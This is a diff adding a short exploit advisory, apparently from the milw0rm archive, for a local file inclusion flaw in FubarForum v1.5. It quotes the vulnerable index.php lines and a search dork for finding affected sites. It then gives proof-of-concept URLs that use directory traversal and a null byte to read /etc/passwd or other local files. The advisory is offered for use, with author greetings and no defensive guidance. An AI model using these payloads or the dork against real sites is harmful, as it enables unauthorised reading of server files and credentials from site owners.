@@ -1,0 +1,31 @@
+###################################################################################
+#
+#   Name   : FubarForum v1.5 Local File Inclusion Vulnerability
+#   Author : cOndemned
+#   Dork   : for ex. "Powered by FubarForum v1.5"
+#   Greetz : TBH, GregStar, ZaBeaTy, irk4z, Hawk, Sandtalker & Avantura ;*
+#
+###################################################################################
+
+Source :
+
+    // index.php
+
+    5.  if (!empty($_GET['page'])) { $page = $_GET['page']; }       // <---- $page is being sended using GET method
+
+    91. if (file_exists("./".$page.".php")) {       // <---- if only the file exists and we can use null byte (%00)
+    
+    98. include("./".$page.".php");                 // <---- our file will be included here :))
+    
+PoC :
+    
+    http://[host]/[fubarforum_path]/index.php?page=../../../../etc/passwd%00
+    http://[host]/[fubarforum_path]/index.php?page=../../../../[local_file]%00
+    
+###################################################################################
+#
+#   Together We stand tall, not gonna crash, not gonna fall - Children of Bodom
+#
+###################################################################################
+
+# milw0rm.com [2008-06-20]
